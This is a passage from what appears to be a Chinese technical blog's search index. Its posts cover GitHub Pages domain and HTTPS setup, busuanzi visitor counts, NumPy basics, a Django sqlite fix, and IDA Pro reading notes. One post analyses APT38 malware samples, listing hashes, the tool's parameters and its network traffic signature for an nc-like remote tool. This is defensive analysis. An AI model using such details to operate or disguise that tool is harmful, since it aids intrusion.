class="number">185.199</span>.<span class="number">111.153</span></span><br><span class="line">          <span class="number">185.199</span>.<span class="number">109.153</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就设置这样四条记录，使得自己的域名指向这些主机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A @ 185.199.110.153</span><br><span class="line">A @ 185.199.108.153</span><br><span class="line">A @ 185.199.111.153</span><br><span class="line">A @ 185.199.109.153</span><br></pre></td></tr></table></figure><p>然后再创建一条CNAME记录，使得原来的github.io域名指向你自己的域名，即当你以github.io域名访问时，会重定向到自己的域名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CNAME www spwpun.github.io</span><br></pre></td></tr></table></figure><p><img src="/2019/12/01/%E7%BB%91%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8A%E6%B7%BB%E5%8A%A0SSL%E8%AF%81%E4%B9%A6/image-20191201165928723.png" alt="image-20191201165928723"></p><h3 id="配置HTTPS"><a href="#配置HTTPS" class="headerlink" title="配置HTTPS"></a>配置HTTPS</h3><p>配置好DNS之后，在刚才的github项目的setting-&gt;options中设置强制使用https,等一段时间就可以正常访问网站了。</p><p><img src="/2019/12/01/%E7%BB%91%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D%E4%BB%A5%E5%8F%8A%E6%B7%BB%E5%8A%A0SSL%E8%AF%81%E4%B9%A6/image-20191201170354303.png" alt="image-20191201170354303"></p><p>配置完有可能你的浏览器访问会报证书不安全，这可能是你的浏览器的缓存的原因，重启一下电脑，清空一下浏览器的缓存应该就好了，证书是由Lets Encrypt签发的，有效期为三个月，github上这样一键配置比在自己的服务器上配置方便很多。</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加busuanzi配置全站访客统计</title>
      <link href="2019/12/01/%E6%B7%BB%E5%8A%A0busuanzi%E9%85%8D%E7%BD%AE%E5%85%A8%E7%AB%99%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/"/>
      <url>2019/12/01/%E6%B7%BB%E5%8A%A0busuanzi%E9%85%8D%E7%BD%AE%E5%85%A8%E7%AB%99%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>务实最重要，我只看重功能而已。原本以为很复杂，实则很简单。</p><p>在hexo的themes\next目录下找到_conifg.yml,搜索找到<code>busuanzi_count</code>,将<code>enable</code>属性改为<code>true</code>,因为我的文章的阅读数是由leancloud来计算的，所以这里<code>post_views</code>就设置成了<code>false</code>，至于icon就不管了。重新生成一下文件就可以了，在本地测试时会显示很大的访客数和访问量，部署到网上就是正常的了。</p><p><img src="/2019/12/01/%E6%B7%BB%E5%8A%A0busuanzi%E9%85%8D%E7%BD%AE%E5%85%A8%E7%AB%99%E8%AE%BF%E5%AE%A2%E7%BB%9F%E8%AE%A1/image-20191201162657094.png" alt="image-20191201162657094"></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Numpy数值计算基础1</title>
      <link href="2019/12/01/Python-Numpy%E6%95%B0%E5%80%BC%E8%AE%A1%E7%AE%97%E5%9F%BA%E7%A1%80/"/>
      <url>2019/12/01/Python-Numpy%E6%95%B0%E5%80%BC%E8%AE%A1%E7%AE%97%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>Numpy库是面向数值计算的库，针对Python内建的数组类型做了扩充，支持更高维度的数组和矩阵运算，以及更丰富的数学函数。同时Numpy也被作为Pandas、matplotlib等库的核心计算库，安装这些库时，需要安装Numpy作为依赖。</p><h3 id="数值类型及多维数组"><a href="#数值类型及多维数组" class="headerlink" title="数值类型及多维数组"></a>数值类型及多维数组</h3><p>NumPy支持比Python本身更为丰富的数值类型，细分如下：</p><table><thead><tr><th align="center">类型</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">bool</td><td align="center">布尔类型，1 个字节，值为 True 或 False。</td></tr><tr><td align="center">int</td><td align="center">整数类型，通常为 int64 或 int32 。</td></tr><tr><td align="center">intc</td><td align="center">与 C 里的 int 相同，通常为 int32 或 int64。</td></tr><tr><td align="center">intp</td><td align="center">用于索引，通常为 int32 或 int64。</td></tr><tr><td align="center">int8</td><td align="center">字节（从 -128 到 127）</td></tr><tr><td align="center">int16</td><td align="center">整数（从 -32768 到 32767）</td></tr><tr><td align="center">int32</td><td align="center">整数（从 -2147483648 到 2147483647）</td></tr><tr><td align="center">int64</td><td align="center">整数（从 -9223372036854775808 到 9223372036854775807）</td></tr><tr><td align="center">uint8</td><td align="center">无符号整数（从 0 到 255）</td></tr><tr><td align="center">uint16</td><td align="center">无符号整数（从 0 到 65535）</td></tr><tr><td align="center">uint32</td><td align="center">无符号整数（从 0 到 4294967295）</td></tr><tr><td align="center">uint64</td><td align="center">无符号整数（从 0 到 18446744073709551615）</td></tr><tr><td align="center">float</td><td align="center">float64 的简写。</td></tr><tr><td align="center">float16</td><td align="center">半精度浮点，5 位指数，10 位尾数</td></tr><tr><td align="center">float32</td><td align="center">单精度浮点，8 位指数，23 位尾数</td></tr><tr><td align="center">float64</td><td align="center">双精度浮点，11 位指数，52 位尾数</td></tr><tr><td align="center">complex</td><td align="center">complex128 的简写。</td></tr><tr><td align="center">complex64</td><td align="center">复数，由两个 32 位浮点表示。</td></tr><tr><td align="center">complex128</td><td align="center">复数，由两个 64 位浮点表示。</td></tr></tbody></table><p>上述类型的转换可以使用<code>astype</code>函数来转换。</p><p>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.array([<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>], dtype = np.float64)</span><br><span class="line"><span class="comment"># the origin type of a is float64</span></span><br><span class="line">a.astype(<span class="built_in">int</span>) <span class="comment"># Convert the type to int64</span></span><br></pre></td></tr></table></figure><p>NumPy 最核心且最重要的一个特性就是 <code>ndarray</code> 多维数组对象，它区别于 Python 的标准类，拥有对高维数组的处理能力，这也是数值计算过程中缺一不可的重要特性。</p><p>NumPy 中，<code>ndarray</code> 类具有六个参数，它们分别为：</p><ul><li><code>shape</code>：数组的形状。</li><li><code>dtype</code>：数据类型。</li><li><code>buffer</code>：对象暴露缓冲区接口。</li><li><code>offset</code>：数组数据的偏移量。</li><li><code>strides</code>：数据步长。</li><li><code>order</code>：<code>&#123;&#39;C&#39;，&#39;F&#39;&#125;</code>，以行或列为主排列顺序。</li></ul><p>下面，我们来了解创建 NumPy 多维数组的一些方法。在 NumPy 中，我们主要通过以下 5 种途径创建数组，它们分别是：</p><ul><li>从 Python 数组结构列表，元组等转换。</li><li>使用 <code>np.arange</code>、<code>np.ones</code>、<code>np.zeros</code> 等 NumPy 原生方法。</li><li>从存储空间读取数组。</li><li>通过使用字符串或缓冲区从原始字节创建数组。</li><li>使用特殊函数，如 <code>random</code>。</li></ul><h4 id="arange-方法创建"><a href="#arange-方法创建" class="headerlink" title="arange 方法创建"></a><code>arange</code> 方法创建</h4><p>除了直接使用 array 方法创建 <code>ndarray</code>，在 NumPy 中还有一些方法可以创建一些有规律性的多维数。首先，我们来看一看 <code>arange()</code>。<code>arange()</code> 的功能是在给定区间内创建一系列均匀间隔的值。方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy.arange(start, stop, step, dtype=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>你需要先设置值所在的区间 <code>[开始， 停止)</code>，这是一个半开半闭区间。然后，在设置 <code>step</code> 步长用于设置值之间的间隔。最后的可选参数 <code>dtype</code>可以设置返回<code>ndarray</code> 的值类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在区间 [3, 7) 中以 0.5 为步长新建数组</span></span><br><span class="line">np.arange(<span class="number">3</span>, <span class="number">7</span>, <span class="number">0.5</span>, dtype=<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="linspace-方法创建"><a href="#linspace-方法创建" class="headerlink" title="linspace 方法创建"></a><code>linspace</code> 方法创建</h4><p><code>linspace</code>方法也可以像<code>arange</code>方法一样，创建数值有规律的数组。<code>linspace</code> 用于在指定的区间内返回间隔均匀的值。其方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy.linspace(start, stop, num=<span class="number">50</span>, endpoint=<span class="literal">True</span>, retstep=<span class="literal">False</span>, dtype=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><ul><li><code>start</code>：序列的起始值。</li><li><code>stop</code>：序列的结束值。</li><li><code>num</code>：生成的样本数。默认值为50。</li><li><code>endpoint</code>：布尔值，如果为真，则最后一个样本包含在序列内。</li><li><code>retstep</code>：布尔值，如果为真，返回间距。</li><li><code>dtype</code>：数组的类型。</li></ul><h4 id="eye-方法创建"><a href="#eye-方法创建" class="headerlink" title="eye 方法创建"></a><code>eye</code> 方法创建</h4><p><code>numpy.eye</code> 用于创建一个二维数组，其特点是<code>k</code> 对角线上的值为 <code>1</code>，其余值全部为<code>0</code>。方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numpy.eye(N, M=<span class="literal">None</span>, k=<span class="number">0</span>, dtype=&lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>N</code>：输出数组的行数。</li><li><code>M</code>：输出数组的列数。</li><li><code>k</code>：对角线索引：0（默认）是指主对角线，正值是指上对角线，负值是指下对角线。</li></ul><h4 id="从已知数据创建"><a href="#从已知数据创建" class="headerlink" title="从已知数据创建"></a>从已知数据创建</h4><p>我们还可以从已知数据文件、函数中创建 <code>ndarray</code>。NumPy 提供了下面 <code>5</code> 个方法：</p><ul><li><code>frombuffer（buffer）</code>：将缓冲区转换为 <code>1</code> 维数组。</li><li><code>fromfile（file，dtype，count，sep）</code>：从文本或二进制文件中构建多维数组。</li><li><code>fromfunction（function，shape）</code>：通过函数返回值来创建多维数组。</li><li><code>fromiter（iterable，dtype，count）</code>：从可迭代对象创建 <code>1</code> 维数组。</li><li><code>fromstring（string，dtype，count，sep）</code>：从字符串中创建 <code>1</code> 维数组。</li></ul><h4 id="ndarray-数组属性"><a href="#ndarray-数组属性" class="headerlink" title="ndarray 数组属性"></a><code>ndarray</code> 数组属性</h4><p>首先，我们创建一个 <code>ndarray</code> 数组，首先，新建 <code>a</code> 并随意设定为一个 2 维数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]])</span><br><span class="line">a  <span class="comment"># 查看 a 的值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.T</code> 用于数组的转置，与 <code>.transpose()</code> 相同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.T</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.dtype</code> 用来输出数组包含元素的数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.dtype</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.imag</code> 用来输出数组包含元素的虚部。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.imag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.real</code>用来输出数组包含元素的实部。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.real</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.size</code>用来输出数组中的总包含元素数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.size</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.itemsize</code>输出一个数组元素的字节数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.itemsize</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.nbytes</code>用来输出数组的元素总字节数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.nbytes</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.ndim</code>用来输出数组尺寸。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.ndim</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.shape</code>用来输出数组维数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.shape</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ndarray.strides</code>用来遍历数组时，输出每个维度中步进的字节数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.strides</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础概念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Numpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APT38样本分析记录</title>
      <link href="2019/11/26/APT38%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95-%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E7%89%B9%E5%BE%81/"/>
      <url>2019/11/26/APT38%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95-%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<h2 id="a1260fd3e9221d1bc5b9ece6e7a5a98669c79e124453f2ac58625085759ed3bb"><a href="#a1260fd3e9221d1bc5b9ece6e7a5a98669c79e124453f2ac58625085759ed3bb" class="headerlink" title="a1260fd3e9221d1bc5b9ece6e7a5a98669c79e124453f2ac58625085759ed3bb"></a>a1260fd3e9221d1bc5b9ece6e7a5a98669c79e124453f2ac58625085759ed3bb</h2><p>通过hash值到微步社区查询报毒情况，只有<code>Baidu-China</code>报了恶意，得不到其他有用的信息，也看不到任何的网络行为，不过看到了一个比较有用的静态信息就是很多加密的指纹：</p><p><img src="/2019/11/26/APT38%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95-%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E7%89%B9%E5%BE%81/image-20191122094404772.png"></p><p>为了让自己的IDA能够识别这些加密指纹，我安装了Findcrypt插件，该插件需要安装yara-python库，具体的安装方法见其<a href="https://github.com/polymorf/findcrypt-yara">github地址</a>。</p><p>由于分析只要求分析网络通信特征，其实要不要这个插件作用都不大，后续分析出该样本在登录到目标服务器时会先发送一个登录frame，其中的数据是部分固定的，也就可以提取出来作为通信特征了。该样本需要参数来设置登录的服务器、登录名、密码等信息，所以在沙箱中检测并没有检测出网络行为。</p><h2 id="a3a1a43f0e631c10ab42e5404b61580e760e7d6f849ab8eb5848057a8c60cda2"><a href="#a3a1a43f0e631c10ab42e5404b61580e760e7d6f849ab8eb5848057a8c60cda2" class="headerlink" title="a3a1a43f0e631c10ab42e5404b61580e760e7d6f849ab8eb5848057a8c60cda2"></a>a3a1a43f0e631c10ab42e5404b61580e760e7d6f849ab8eb5848057a8c60cda2</h2><p>同上一个样本功能基本一致，特征数据也一致，只不过程序是以控制台程序的方式编译的，而上一个则是Windows应用程序。两者在连接到-s参数指向的服务器后，都会向其发送以<code>92 10 00 00</code>结尾的<code>login frame</code>数据，这就是其网络通信特征。</p><h2 id="515fdca93acf6a8d23b4fe67d51d4cab5cda6ddbc3d508dd63b61c432d169ca7"><a href="#515fdca93acf6a8d23b4fe67d51d4cab5cda6ddbc3d508dd63b61c432d169ca7" class="headerlink" title="515fdca93acf6a8d23b4fe67d51d4cab5cda6ddbc3d508dd63b61c432d169ca7"></a>515fdca93acf6a8d23b4fe67d51d4cab5cda6ddbc3d508dd63b61c432d169ca7</h2><p>被upx加壳了，脱壳后的SHA-256为：<code>9049c508327ed3ab72df33328145eb226e53805d90dd74c353067f5b167747f3</code>,在微步上检测恶意程度更为明显。且通过CCF的PE文件比较发现这个样本和第一个样本基本一致，除了因为文件名导致的部分不同以外，其他区段完全相同。</p><h2 id="22d244fe63f27279db4b082afe296cd931cf377e3b9501fc8ffc372cb31f076a"><a href="#22d244fe63f27279db4b082afe296cd931cf377e3b9501fc8ffc372cb31f076a" class="headerlink" title="22d244fe63f27279db4b082afe296cd931cf377e3b9501fc8ffc372cb31f076a"></a>22d244fe63f27279db4b082afe296cd931cf377e3b9501fc8ffc372cb31f076a</h2><p>这个样本貌似是脱完壳，未重建PE文件的输入表的Dump文件，但仍然可以通过IDA看出其基本逻辑。其功能同以上分析的样本基本一致。特征数据也一致。</p><h2 id="7efe8a7ad9c6a6146bddd5aef9ceba477ca6973203a41f4b7f823095a90cb10f"><a href="#7efe8a7ad9c6a6146bddd5aef9ceba477ca6973203a41f4b7f823095a90cb10f" class="headerlink" title="7efe8a7ad9c6a6146bddd5aef9ceba477ca6973203a41f4b7f823095a90cb10f"></a>7efe8a7ad9c6a6146bddd5aef9ceba477ca6973203a41f4b7f823095a90cb10f</h2><p>样本的功能还是和上面的几个样本一致。特征数据也一致，既然这样，那就来分析分析其他的特征吧，网络通信特征就和send函数有关，因为样本使用的网络通信方式都是Socket编程。对send函数查看交叉引用，目前仍未发现特殊的数据，使用CONNECT的HTTP请求方式建立代理连接。应该就这样吧，明天再整理一下吧！</p><h2 id="整理总结"><a href="#整理总结" class="headerlink" title="整理总结"></a>整理总结</h2><p>这几个样本都是同一类型的，目的都是为了连接到远程服务器，根据微步检测的部分结果，推测应该是作为一个类似<code>nc</code>的黑客工具来使用的。</p><p>主要参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-s&#x2F;--server IP:Port 登录的服务器IP及端口</span><br><span class="line">-d&#x2F;--destination IP:Port 目的服务器IP及端口（作用不太清楚）</span><br><span class="line">-u&#x2F;--username  用户名</span><br><span class="line">-pw&#x2F;--password 密码</span><br></pre></td></tr></table></figure><p>其网络通信特征为：在设置<code>-s</code>参数后，运行程序会连接到目标主机，然后在通信的过程中数据包的包头会包含一段特殊数据，其中前16个字节为“aaaabbbbccccdddd”，然后是4字节的数据包类型，接着是4字节未使用的数据字段，加上4字节的rand函数生成的随机种子，再加上4字节的尾部大小（分析时均为0x4），最后是尾部的4字节固定数据（“0x00001092”）。</p>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apt38 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django Error：no module named _sqlite3</title>
      <link href="2019/11/04/Django-Error%EF%BC%9Ano-module-named-sqlite3/"/>
      <url>2019/11/04/Django-Error%EF%BC%9Ano-module-named-sqlite3/</url>
      
        <content type="html"><![CDATA[<ul><li>简述：在配置服务器端的Django代码文件时，有一步需要将项目的静态文件收集到根目录下的static目录下，需要执行下面的这个命令：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py collectstatic</span><br></pre></td></tr></table></figure>有可能会出现这个错误。解决方法如下：</li><li>退出虚拟环境，如果用的是virtualenv的话：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure></li><li>安装sqlite-devel，依据自己的系统选择：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ yum install sqlite-devel       #centos</span><br><span class="line">$ apt-get install sqlite-devel   #debian  </span><br></pre></td></tr></table></figure></li><li>然后重新编译自己的python环境，进入到自己的python安装包中，之前写过如何安装python的一片文章，就是将安装过程重新走一遍：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make </span><br><span class="line">make install    <span class="comment">#这一步可能要用到管理员权限，sudo</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA Pro阅读笔记</title>
      <link href="2019/10/23/IDA-Pro%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
      <url>2019/10/23/IDA-Pro%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="《IDA-Pro权威指南（第二版）》阅读笔记"><a href="#《IDA-Pro权威指南（第二版）》阅读笔记" class="headerlink" title="《IDA Pro权威指南（第二版）》阅读笔记"></a>《IDA Pro权威指南（第二版）》阅读笔记</h3><p>趁着上班没有样本分析的时间把这本书看完吧！记录一些自己印象深刻的知识点。有些自己已经比较熟悉的点不会列出来了。</p><h4 id="第一部分-IDA简介"><a href="#第一部分-IDA简介" class="headerlink" title="第一部分 IDA简介"></a>第一部分 IDA简介</h4><h5 id="第1章-反汇编简介"><a href="#第1章-反汇编简介" class="headerlink" title="第1章 反汇编简介"></a>第1章 反汇编简介</h5><ol><li>模糊测试：模糊测试是一种发现漏洞的技术，它为程序输入大量不常见的输入，希望其中某些输入能对程序造成可被检测、分许，最终被利用的错误。</li><li>x86汇编语言的两种语法：Intel、AT&amp;T，gdb使用AT&amp;T语法，MASM、TASM、NASM使用Intel语法。</li><li>反汇编的算法有线性扫描、递归下降两种。</li></ol><h5 id="第2章-逆向与反汇编"><a href="#第2章-逆向与反汇编" class="headerlink" title="第2章 逆向与反汇编"></a>第2章 逆向与反汇编</h5><p>这一工具主要介绍了一些小工具。</p><ol><li><p>nm：摘要工具，用来列举目标文件的符号。</p></li><li><p>ldd：摘要工具，用来列举可执行文件所需的动态库，这才想起来之前做Pwn的时候，看到有别人用这个命令查看可执行文件的依赖库。</p></li></ol><h5 id="第3章-IDA-Pro背景知识"><a href="#第3章-IDA-Pro背景知识" class="headerlink" title="第3章 IDA Pro背景知识"></a>第3章 IDA Pro背景知识</h5><p>这一章主要讲了IDA的开发历史及其反盗版的一些措施，大致介绍了本书的一些关键性内容，其中讲插件的章节是在第17章，这是后面我要详细看的地方。</p><h4 id="第二部分-IDA基本用法"><a href="#第二部分-IDA基本用法" class="headerlink" title="第二部分 IDA基本用法"></a>第二部分 IDA基本用法</h4><h5 id="第4章-IDA入门"><a href="#第4章-IDA入门" class="headerlink" title="第4章 IDA入门"></a>第4章 IDA入门</h5><p>介绍了IDA使用的一些小技巧，并没有值得我记录的，要说我积累出来的就是<code>Esc</code>和<code>Ctrl+W</code>的使用了，还有<code>Space</code>,<code>Tab</code>,<code>N</code>,<code>Y</code>,<code>A</code>这些快捷键的使用，得益于参加的之前的实验室的项目。</p><ol><li>当你不小心拖动了一些窗口后，发现想移动却移动不回去了，使用Windows &gt; Reset Desktop可以恢复原始的布局。</li></ol><h5 id="第5章-IDA数据显示窗口"><a href="#第5章-IDA数据显示窗口" class="headerlink" title="第5章 IDA数据显示窗口"></a>第5章 IDA数据显示窗口</h5><p>介绍了IDA的一些常见的显示窗口，我算是比较熟悉了，这里就不记录了。<br>经常用到的有反汇编窗口、16进制窗口、字符串窗口、导入窗口、导出窗口、伪代码窗口。</p><h5 id="第6章-反汇编导航"><a href="#第6章-反汇编导航" class="headerlink" title="第6章 反汇编导航"></a>第6章 反汇编导航</h5><ol><li>对栈帧有了比较新的认识：<blockquote><p>编译器通过栈帧（也叫做激活记录）使得对函数参数和局部变量进行分配和释放的过程对程<br>序员透明。在将控制权转交给函数之前，编译器会插入代码，将函数参数放入栈帧内，并分配足<br>够的内存，以保存函数的局部变量。鉴于栈帧的结构，该函数的返回地址也存储在新的栈帧内。<br>使用栈帧使得递归成为可能，因为每个递归函数调用都有它自己的栈帧，这恰好将当前调用与前<br>一次调用分隔开来。</p></blockquote></li><li>对fastcall的新认识：<blockquote><p>fastcall约定是stdcall约定的一个变体，它向CPU寄存器（而非程序栈）最多传递两个参数。<br>Microsoft Visual C/C++ 和GNU gcc/g++（3.4及更低版本）编译器能够识别函数声明中的fastcall<br>修饰符。如果指定使用fastcall约定，则传递给函数的前两个参数将分别位于ECX和EDX寄存器<br>中。剩余的其他参数则以类似于stdcall约定的方式从右到左放入栈上。同样与stdcall约定类似<br>的是，在返回其调用方时，fastcall函数负责从栈中删除参数。下面的声明中即使用了fastcall<br>修饰符：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> fastcall <span class="title">demo_fastcall</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span>;</span><br><span class="line">; demo_fastcall(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>); <span class="comment">//programmmer calls demo_fastcall</span></span><br><span class="line">push <span class="number">4</span></span><br><span class="line">push <span class="number">3</span></span><br><span class="line">mov edx, <span class="number">2</span></span><br><span class="line">mov ecx, <span class="number">1</span></span><br><span class="line">call demo_fastcall</span><br></pre></td></tr></table></figure></li></ol><h5 id="第7章-反汇编操作"><a href="#第7章-反汇编操作" class="headerlink" title="第7章 反汇编操作"></a>第7章 反汇编操作</h5><p>也是自己比较熟悉的地方吧，数据的转换，数组的设置，函数的操作，类型的设置，在自己实习的时候做样本分析时都体验过了，那个远控木马至今印象深刻。</p><h5 id="第8章-数据类型与数据结构"><a href="#第8章-数据类型与数据结构" class="headerlink" title="第8章 数据类型与数据结构"></a>第8章 数据类型与数据结构</h5><ol><li>关于数组的成员的访问，本章中列出了三种类型的数组：全局变量的数组、栈生成的数组以及堆生成的数组。前两种数组的访问方式基本一致，都是直接获取数组变量的地址来进行赋值，而堆生成的数组由于是由<code>malloc</code>或者<code>new</code>等方法动态得到的，在IDA中静态分析时并不能得到其真正的地址，所以需要通过寄存器先获取其基址，再根据偏移访问其成员，这和结构体的访问类似。</li><li>同样也有对结构体的访问，也包括三中类型：全局的、栈分配的、堆分配的。如果一个结构体在堆中分配，那么对编译器来说，引用该结构体的唯一线索就是指向该结构体起始地址的指针。而另外两种在编译时是能够计算出其固定地址的。</li><li>解析头文件：要解析头文件，可以使用File&gt;Load File&gt;Parse C Header File（文件&gt;加载文件&gt;解析C 头<br>文件）选择你想要解析的头文件。</li><li>遇到虚函数的问题：虚函数是用于实现多态行为的，虚函数的地址在编译时不能确定，只能在即将调用进行时确定（通过虚函数表）。<blockquote><p>且C++中程序会以ecx作为this指针的载体传递给虚成员函数。</p></blockquote></li></ol><h5 id="第9章-交叉引用与绘图功能"><a href="#第9章-交叉引用与绘图功能" class="headerlink" title="第9章 交叉引用与绘图功能"></a>第9章 交叉引用与绘图功能</h5><ol><li><p>三种代码交叉引用：读取交叉引用、写入交叉引用、偏移交叉引用。</p><blockquote><p>一般而言，以一个程序指令字节为目标的写入交叉引用表示这是一段自修改代码，这种代码通常被视为无效代码，在恶意软件使用的“去模糊例程”（de-obfuscation 